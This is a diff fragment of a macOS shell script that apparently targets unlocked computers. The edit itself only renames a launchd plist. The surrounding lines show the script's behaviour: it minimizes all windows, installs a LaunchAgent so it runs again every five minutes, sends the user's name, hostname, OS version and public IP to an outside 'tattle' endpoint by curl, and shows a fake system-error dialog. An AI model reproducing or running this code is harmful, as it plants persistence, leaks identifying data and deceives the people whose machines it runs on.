@@ -77,7 +77,7 @@ osascript -e 'tell application "System Events" to set miniaturized of every wind
 if [[ -f $HOME/.unlocked ]]; then
   launchctl remove com.sres.unlocked 2>/dev/null
     # Create a launchd command to run this script again in 5 minutes
-    cat > $HOME/Library/LaunchAgents/com.sre.unlocked.plist <<EOF
+    cat > $HOME/Library/LaunchAgents/com.sres.unlocked.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -96,7 +96,7 @@ if [[ -f $HOME/.unlocked ]]; then
 </dict>
 </plist>
 EOF
-    launchctl load $HOME/Library/LaunchAgents/com.sre.unlocked.plist
+    launchctl load $HOME/Library/LaunchAgents/com.sres.unlocked.plist
 fi
  curl -X POST -s "https://runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)"
 osascript -e 'tell app "System Events" to display dialog "An unknown error occurred. Have you tried turning it off and on again?" with title "System Error"'
